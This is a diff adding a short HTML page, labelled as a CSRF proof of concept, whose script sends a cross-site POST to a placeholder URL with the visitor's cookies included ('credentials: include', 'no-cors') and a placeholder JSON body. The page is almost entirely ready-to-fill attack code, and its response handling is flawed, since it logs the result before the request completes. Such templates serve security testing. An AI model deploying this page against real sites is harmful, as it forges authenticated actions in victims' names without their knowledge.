@@ -1,0 +1,33 @@
+<html>
+  <script>
+const dataToSend = JSON.stringify(INSERT_JSON_DATA_HERE);
+let dataReceived = ""; 
+fetch("ADD_URL_HERE", {
+    credentials: 'include',
+    mode: 'no-cors',
+    method: "post",
+    headers: { "Content-Type": "application/json" },
+    body: dataToSend
+})
+    .then(resp => {
+        if (resp.status === 200) {
+            return resp.json()
+        } else {
+            console.log("Status: " + resp.status)
+            return Promise.reject("server")
+        }
+    })
+    .then(dataJson => {
+        dataReceived = JSON.parse(dataJson)
+    })
+    .catch(err => {
+        if (err === "server") return
+        console.log(err)
+    })
+
+console.log(`Received: ${dataReceived}`)                
+</script>
+  <body>
+  <h1>This is a CSRF PoC</h1>
+  </body>
+</html>
